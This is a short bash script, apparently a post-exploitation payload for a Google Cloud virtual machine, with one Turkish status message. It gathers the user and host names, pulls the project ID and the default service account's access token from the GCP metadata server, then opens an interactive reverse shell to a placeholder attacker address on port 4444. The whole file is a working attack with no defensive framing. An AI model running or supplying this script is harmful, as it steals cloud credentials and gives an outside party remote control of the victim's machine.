#!/bin/bash

echo "[+] User and Host:"
whoami
hostname

echo "[+] Project ID:"
curl -s -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/project/project-id

echo "[+] Token:"
curl -s -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token

echo "[+] Reverse shell başlatılıyor..."
bash -i >& /dev/tcp/YOUR_IP/4444 0>&1
